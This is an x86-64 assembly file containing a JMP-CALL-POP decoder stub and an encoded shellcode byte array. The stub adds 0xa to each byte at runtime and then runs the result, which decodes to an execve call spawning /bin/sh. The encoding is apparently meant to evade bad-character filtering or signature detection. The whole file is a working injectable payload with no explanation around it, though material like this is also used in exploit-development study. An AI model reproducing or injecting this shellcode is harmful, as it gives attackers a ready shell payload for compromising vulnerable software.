global _start
section .text
_start:
    jmp find_address
decoder:
    pop rdi
    xor rcx, rcx
    add cl, 60
decode:
    add byte [rdi], 0xa
    inc rdi
    cmp byte [rdi], 0x0a
    je encoded_shellcode
    loop decode
    jmp encoded_shellcode
find_address:
    call decoder
    encoded_shellcode: db 0x3e,0x27,0xb6,0x46,0x3e,0xb1,0x25,0x58,0x5f,0x64,0x25,0x25,0x69,0x5e,0x49,0x3e,0x7f,0xdd,0x46,0x3e,0x7f,0xd8,0x4d,0x3e,0x7f,0xdc,0x3e,0x79,0xb6,0x31,0x05,0xfb,0x0a
